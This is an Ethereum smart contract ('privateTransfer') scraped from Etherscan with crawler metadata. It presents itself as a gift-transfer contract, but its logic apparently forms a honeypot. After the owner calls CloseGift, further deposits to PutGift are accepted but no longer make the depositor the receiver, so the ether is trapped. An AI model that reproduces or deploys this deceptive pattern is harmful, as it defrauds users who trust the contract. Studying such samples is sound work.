//token_name	
//token_url	https://etherscan.io//address/0x2cc8e271F11934F5Fa15942dFDa2b59432C2E0f3#code
//spider_time	2018/07/08 11:51:33
//token_Transactions	12 txns
//token_price	

pragma solidity ^0.4.19;

contract privateTransfer
{
    address sender;
    
    address reciver;
    
    bool closed = false;
    
    uint unlockTime;
 
    function PutGift(address _reciver)
    public
    payable
    {
        if( (!closed&&(msg.value > 1 ether)) || sender==0x00 )
        {
            sender = msg.sender;
            reciver = _reciver;
            unlockTime = now;
        }
    }
    
    function SetGiftTime(uint _unixTime)
    public
    {
        if(msg.sender==sender)
        {
            unlockTime = _unixTime;
        }
    }
    
    function GetGift()
    public
    payable
    {
        if(reciver==msg.sender&&now>unlockTime)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function CloseGift()
    public
    {
        if(sender == msg.sender && reciver != 0x0 )
        {
           closed=true;
        }
    }
    
    function() public payable{}
}